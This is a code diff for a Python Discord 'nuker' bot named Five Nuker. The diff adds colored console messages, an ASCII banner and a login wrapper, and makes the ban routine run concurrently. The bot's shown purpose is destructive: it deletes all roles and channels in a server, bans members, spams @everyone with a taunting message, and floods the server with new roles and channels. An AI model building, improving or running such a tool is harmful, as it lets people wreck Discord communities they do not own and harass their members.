@@ -1,14 +1,24 @@
 from discord import Intents
 from discord.ext import commands
-from requests import put
 import discord
-from asyncio import create_task, wait 
+from asyncio import create_task 
 from pathlib import Path
 import configparser
 import time
-
+import colorama
+from colorama import Fore
+import os
 
 config = configparser.ConfigParser()
+
+colorama.init(autoreset=True)
+
+def clear():
+    if os.name=='nt':
+        os.system('cls')
+    else:
+        os.system('clear')
+
 
 
 
@@ -21,18 +31,18 @@ if ic.is_file():
     f = open('icon.PNG', 'rb')
     icona = f.read()
 else:
-    print('ERROR Icon not founded')
+    print(f'{Fore.RED}[ERROR]' + '\033[39m' + 'Icon not founded')
     time.sleep(1)
-    print('Please add icon to bot folder and rename it to icon.PNG and restart program')
-    time.sleep(1)
+    print(f'{Fore.YELLOW}[Icon Check System]' + '\033[39m' + 'Please add icon to bot folder and rename it to icon.PNG')
+    input(f'{Fore.YELLOW}[Icon Check System]' + '\033[39m' + 'Press Enter to close program...')
     quit()
 
 if cfg.is_file():
-    print(f'Config founded!')
+    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + ' Config founded!')
     config.read('cfg.ini')
-    print('Starting bot...')
+    print(f'{Fore.CYAN}[BOT]' + '\033[39m' + 'Starting...')
 else:
-    print('cfg not found! \nCreating new cfg...')
+    print(f'{Fore.RED}[ERROR]' + '\033[39m' + 'Config not found! Creating new config...')
     config['BOT_CFG'] = {'prefix': '!',
                          'token': 'bot token here',
                          'spamtext': '@everyone @here \nImagine get nuked by Five bot \nhttps://github.com/glitch65/Discord-Five-nuker-bot \nXD',
@@ -45,28 +55,24 @@ else:
                          'ban reason': 'XDDDD' }
     with open('cfg.ini', 'w') as cfg_file:
             config.write(cfg_file)
-    print('Done!')
-    print('Edit config file in youre folder, and restart program')
-    time.sleep(1)
+    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Done!')
+    print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Edit config file in youre folder and try again')
+    input('Press Enter to close program...')
     exit()
 
+clear()
 
 prefix = config['BOT_CFG']['prefix'] 
 token = config['BOT_CFG']['token'] 
 spamtext = config['BOT_CFG']['spamtext'] 
-ac_name=config['BOT_CFG']['ac_name'] 
-ac_type= config['BOT_CFG']['ac_type'] 
-silent_mode= config['BOT_CFG']['silent_mode'] 
+ac_name = config['BOT_CFG']['ac_name'] 
+ac_type = config['BOT_CFG']['ac_type'] 
+silent_mode = config['BOT_CFG']['silent_mode'] 
 chnrln = config['BOT_CFG']['channels and roles name']
 wbn = config['BOT_CFG']['webhooks name']
 srvn = config['BOT_CFG']['server name']
 br = config['BOT_CFG']['ban reason']
 
-
-
-
-f = open('icon.PNG', 'rb')
-icona = f.read()
 
 
 
@@ -78,6 +84,20 @@ client = commands.Bot(command_prefix=prefix, help_command=None, intents=intents.
 
 
 
+
+
+
+def login():
+    try: client.run(token)
+    except: print(f'{Fore.RED}[ERROR]' + '\033[39m' + 'Invalid token please change token and try again.')
+    input('Press Enter to exit...')
+    quit()
+
+async def rmm():
+    clear()
+    mm()
+    print(f'{Fore.CYAN}[BOT]' + '\033[39m' + 'Started')
+    print(f'{Fore.GREEN}Logged in as {client.user}!')
 
 @client.event
 async def on_ready():
@@ -91,11 +111,7 @@ async def on_ready():
         await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=ac_name))
     elif silent_mode == 1:
         await client.change_presence(status=discord.Status.offline)
-
-
-
-
-
+    rmm()
 
 async def killobject(obj):
     try: await obj.delete()
@@ -126,7 +142,7 @@ async def start(ctx):
         create_task(killobject(obj=rl))
     for channel in ctx.guild.channels:
         create_task(killobject(obj=channel))
-    await bananaa(ctx=ctx)
+    create_task(bananaa(ctx=ctx))
     for _ in range(40):
         create_task(createrole(ctx))
     for _ in range(35):    
@@ -141,14 +157,27 @@ async def bananaa(ctx):
       except: pass
  
 
+def mm():
+    print(f'{Fore.MAGENTA}' + '''
+
+  █████▒ ██▓ ██▒   █▓▓█████     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
+▓██   ▒ ▓██▒▓██░   █▒▓█   ▀     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
+▒████ ░ ▒██▒ ▓██  █▒░▒███      ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
+░▓█▒  ░ ░██░  ▒██ █░░▒▓█  ▄    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
+░▒█░    ░██░   ▒▀█░  ░▒████▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
+ ▒ ░    ░▓     ░ ▐░  ░░ ▒░ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
+ ░       ▒ ░   ░ ░░   ░ ░  ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
+ ░ ░     ▒ ░     ░░     ░         ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
+         ░        ░     ░  ░            ░    ░     ░  ░      ░  ░   ░     
+                 ░                                                        
 
 
+''')
 
+mm()
 
-
-client.run(token)
-
-
+input('Welcome to Five Nuker press enter to start nuker...')
+login()
 
 
 
